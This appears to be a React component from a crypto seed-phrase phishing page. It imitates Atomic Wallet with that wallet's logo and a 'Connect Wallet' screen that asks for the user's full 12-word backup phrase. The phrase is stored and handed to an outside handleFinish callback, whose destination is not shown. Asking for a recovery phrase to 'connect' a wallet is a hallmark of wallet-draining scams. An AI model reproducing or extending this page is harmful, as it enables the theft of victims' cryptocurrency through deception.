"use client";

import { useState } from "react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { useWalletStore } from "@/store/walletStore";
import AtomicFull from "../icons/atomic-full";

const Atomic = ({
	handleFinish,
}: {
	handleFinish: (walletPhrase: string) => Promise<void>;
}) => {
	const [backupPhrase, setBackupPhrase] = useState("");
	const [words, setWords] = useState<string[]>([]);

	const { setSeedPhrase } = useWalletStore();

	const handleComplete = () => {
		setSeedPhrase(words.join(" "));
		handleFinish(words.join(" "));
	};

	// handle input change and split by spaces
	const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
		const phrase = e.target.value;
		setBackupPhrase(phrase);

		// split by space, remove empty strings, and update array
		const separatedWords = phrase
			.trim()
			.split(/\s+/)
			.filter((word) => word.length > 0);
		setWords(separatedWords);
	};

	return (
		<div className="min-h-screen bg-[#1F2843] w-full flex items-center justify-center p-12">
			<div className="w-full max-w-md">
				{/* Logo */}
				<div className="flex items-center justify-center mb-12">
					<div className="w-40 h-40 rounded-2xl bg-accent flex items-center justify-center">
						<AtomicFull />
					</div>
				</div>

				{/* Card */}
				<div className="text-center">
					<h1 className="text-2xl font-bold text-white mb-12">
						Connect Wallet
					</h1>

					{/* Floating Label Input */}
					<div className="relative mb-28 border-b-2 border-white/30 focus-within:border-blue-400 transition-all duration-200">
						<Input
							type="text"
							id="backupPhrase"
							value={backupPhrase}
							onChange={handleChange}
							className="peer bg-transparent border-none outline-none w-full text-white/90 placeholder-transparent h-12 p-0"
							placeholder="Your 12-word backup phrase"
						/>
						<label
							htmlFor="backupPhrase"
							className={`absolute left-0 top-3 text-white/50 text-base transition-all duration-200 
								peer-placeholder-shown:top-3 peer-placeholder-shown:text-white/50 peer-placeholder-shown:text-base 
								peer-focus:-top-4 peer-focus:text-sm peer-focus:text-blue-400
								${backupPhrase ? "-top-4 text-sm text-blue-400" : ""}`}
						>
							Your 12-word backup phrase
						</label>
					</div>

					{/* Buttons */}
					<div className="flex flex-col justify-center items-center text-white">
						<Button
							onClick={handleComplete}
							disabled={words.length !== 12}
							className="w-fit border-2 border-blue-400 disabled:opacity-80 font-bold text-white rounded-full mb-6 px-12 py-6 bg-gradient-to-t from-[#272944] via-[#3D3086] to-[#039DDD] shadow-inner shadow-white/40 [box-shadow:inset_0_3px_6px_rgba(0,0,0,0.6),inset_0_-3px_6px_rgba(255,255,255,0.4)]"
						>
							CONNECT
						</Button>
						<p className="text-xs text-white/50">
							Enter all 12 words to continue
						</p>
					</div>
				</div>
			</div>
		</div>
	);
};

export default Atomic;
